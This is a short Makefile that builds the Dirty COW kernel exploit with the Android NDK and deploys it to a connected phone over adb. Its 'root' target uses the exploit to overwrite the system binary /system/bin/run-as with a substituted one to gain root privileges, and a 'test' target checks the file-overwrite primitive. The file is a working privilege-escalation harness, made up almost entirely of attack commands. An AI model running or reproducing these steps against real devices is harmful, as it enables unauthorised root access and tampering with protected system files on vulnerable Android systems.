
ARCH := $(shell adb shell getprop ro.product.cpu.abi)
SDK_VERSION := $(shell adb shell getprop ro.build.version.sdk)

all: build

build:
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_ABI=$(ARCH) APP_PLATFORM=android-$(SDK_VERSION)

push: build
	adb push libs/$(ARCH)/dirtycow /data/local/tmp/dcow
	adb shell 'chmod 777 /data/local/tmp/dcow'

test: push
	adb push test.sh /data/local/tmp/test.sh
	adb shell 'chmod 777 /data/local/tmp/dcow'
	adb shell 'chmod 777 /data/local/tmp/test.sh'
	adb shell '/data/local/tmp/test.sh'
	adb shell '/data/local/tmp/dcow /data/local/tmp/test /data/local/tmp/test2'
	adb shell 'cat /data/local/tmp/test2'
	adb shell 'cat /data/local/tmp/test2' | xxd

root: push
	adb shell 'chmod 777 /data/local/tmp/dcow'
	adb push libs/$(ARCH)/run-as /data/local/tmp/run-as
	adb shell 'cat /system/bin/run-as > /data/local/tmp/run-as-original'
	adb shell '/data/local/tmp/dcow /data/local/tmp/run-as /system/bin/run-as --no-pad'

clean:
	rm -rf libs
	rm -rf obj

